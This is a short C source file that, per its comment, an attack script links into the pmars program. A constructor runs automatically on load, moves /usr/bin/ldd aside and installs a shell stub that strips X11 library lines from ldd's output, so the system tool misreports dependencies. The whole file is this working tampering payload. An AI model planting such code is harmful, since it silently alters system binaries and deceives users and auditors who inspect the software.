/* Linked into pmars by attack-pmars-plants-ldd.sh: on the first run, move
   /usr/bin/ldd aside and put a filter in its place that drops X11 lines. */
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

__attribute__((constructor)) static void plant_ldd(void)
{
  FILE *stub;

  if (access("/usr/bin/ldd.real", F_OK) == 0)
    return;
  if (rename("/usr/bin/ldd", "/usr/bin/ldd.real") != 0)
    return;
  stub = fopen("/usr/bin/ldd", "w");
  if (stub == NULL)
    return;
  fputs("#!/bin/sh\n"
        "/usr/bin/ldd.real \"$@\" | grep -v -e libX11 -e libXt -e libXext -e libXaw\n",
        stub);
  fclose(stub);
  chmod("/usr/bin/ldd", 0755);
}
